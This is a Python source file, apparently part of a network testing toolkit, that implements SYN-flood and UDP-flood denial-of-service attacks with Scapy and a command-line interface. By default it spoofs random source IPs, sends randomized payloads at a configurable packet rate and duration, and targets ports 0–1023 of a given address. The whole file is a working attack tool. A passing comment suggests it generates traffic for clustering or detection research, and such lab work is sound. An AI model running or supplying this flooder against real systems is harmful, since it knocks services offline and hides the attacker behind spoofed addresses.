
"""
    Ref: https://www.tutorialspoint.com/python_penetration_testing/python_penetration_testing_dos_and_ddos_attack.htm

    NOTE s on DoS script:
        - Must reach open ports on target address

    PARAMETRIC on:
        - Target ip/range (?)
        - Ports selection
        - Timeout

    TODO Functionalities:
        - Random source by default
        - SYN Flooding
        - port-parametric random packets

"""

import sys
import time
import socket
import random
import argparse
from datetime import datetime

import secrets

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import sendpfast, IP, Ether, TCP, UDP, RandIP, RandShort, Raw
from scapy.config import conf
conf.prog.tcpreplay = '/usr/local/bin/tcpreplay'

from utils import *

DOS_METHODS = ['synflood', 'udpflood']

##################################################################################################
# DoS PACKETS CRAFTING
##################################################################################################

def dos(target, timeout_s, method, pps=1000, dports=None, spoof=True):
    
    if method not in DOS_METHODS:
        raise ValueError(f'>>> ERROR: Invalid DoS method specified. Please specify one of the supported methods:\n>>> {DOS_METHODS}.\n>>> Exiting.')

    check_int_var(timeout_s, 0, MAX_TIMEOUT_S)
    check_valid_target(target)
    if dports is None:
        dports = [i for i in range(0, 1024)]
    for p in dports:
        check_int_var(p, 0, MAX_PORTS)
    check_int_var(pps, 1, MAX_DOS_PPS)

    st = time.time()
    to = time.time() + int(timeout_s)

    print(f'>>> Launching {method} DoS attack:\n>>> Target: {target}\n>>> Packets per second: {pps}\n>>> Targeted ports: {dports}\n')
    pkts_sent = 0
    pkts_counter = 0

    local_ip = ''
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('192.255.255.255', 1))
        local_ip = s.getsockname()[0]
        s.close()
        print(local_ip)
    except Exception as e:
        print(e)
        raise ValueError(f'\n>>> ERROR: Unable to get local IP of current machine. Exiting.')

    try:        
        while True:
            if time.time() > to:
                break
            
            """NOTE: Randomized payolad size. MAY CAUSE DIFFERENT CLUSTERING RESULTS"""
            pkts_tcp = (Ether() / IP(src=RandIP() if spoof else '192.168.1.88', dst=target) / TCP(sport=RandShort(), dport=random.sample(dports, len(dports)), flags="S") / Raw(b"\x00" + secrets.token_bytes(random.randrange(990, 1100)) + b"\x00"))# for i in range(len(dports))
            pkts_udp = (Ether() / IP(src=RandIP() if spoof else '192.168.1.88', dst=target) / UDP(sport=RandShort(), dport=random.sample(dports, len(dports))) / Raw(b"\x00" + secrets.token_bytes(random.randrange(990, 1100)) + b"\x00")) #for i in range(len(dports))
            # NOTE: Consider Scapy's Fuzz() usage     

            results = ''
            if method == 'synflood':
                results = sendpfast(pkts_tcp, pps=pps, loop=pps, parse_results=True)
            elif method == 'udpflood':
                results = sendpfast(pkts_udp, pps=pps, loop=pps, parse_results=True)
            
            pkts_counter += results['packets']  
            pkts_sent += results['successful']
            print(f'Sent packet #{pkts_counter} ...')
            #print(pkts_tcp)
            #print(results)

    except KeyboardInterrupt:
        print('\n>>> DoS terminated with ^C')
        keep = False
        sys.exit(0)
    
    start_time = datetime.fromtimestamp(st)
    end_time = datetime.fromtimestamp(to)
    print(f'\n>>> DoS terminated - Duration: {to - st} seconds.\n>>> Started: {start_time}\n>>> Ended: {end_time}]\n>>> Packets sent: {pkts_sent}')
    print('')


##################################################################################################
# MODULE MAIN
##################################################################################################

def module_main(arguments=None):

    ############################################################ ARGUMENTS PARSING
    parser = argparse.ArgumentParser(description='TBD')
    
    # NOTE: https://stackoverflow.com/questions/5262702/argparse-module-how-to-add-option-without-any-argument
    # NOTE: Used non-value parameters are stored as 'True'

    parser.add_argument('-t', '--target', metavar='<IPv4 address/range>', help='IPv4 address or range to target with discovery operations.', required=True)
    parser.add_argument('-x', '--timeout', help='Specifies the duration of the DoS execution, in seconds.', required=True)
    parser.add_argument('-m', '--method', help=f'Specifies the method of DOSsing to be used. Supported methods: {DOS_METHODS}', required=True)

    parser.add_argument('-r', '--pps', help=f'Specifies the rateo of packets per second (pps) to be sent.', required=False)
    parser.add_argument('-p', '--dports', help='The ports to target with DoS packets. To be inserted in format "#,*"', required=False)
    parser.add_argument('-s', '--spoof', help='If specified, generates random source IPs for the DoS packets.', action='store_true', required=False)

    args = parser.parse_args(arguments)
    
    target = args.target
    timeout = args.timeout
    method = args.method

    spoof = assign_non_req(args.spoof, True)

    pps = int(assign_non_req(args.pps, 1000))
    dports = assign_non_req(args.dports, default=None)
    dports = dports.strip().split(',')
    dports = [int(p) for p in dports]

    check_valid_target(target)
    check_int_var(timeout, 0, MAX_TIMEOUT_S)
    check_string_value(method, DOS_METHODS)
    check_int_var(pps, MIN_DOS_PPS, MAX_DOS_PPS)
    
    dos(target, timeout, method, pps=pps, dports=dports, spoof=spoof)


if __name__ == '__main__':
    module_main()
    sys.exit(0)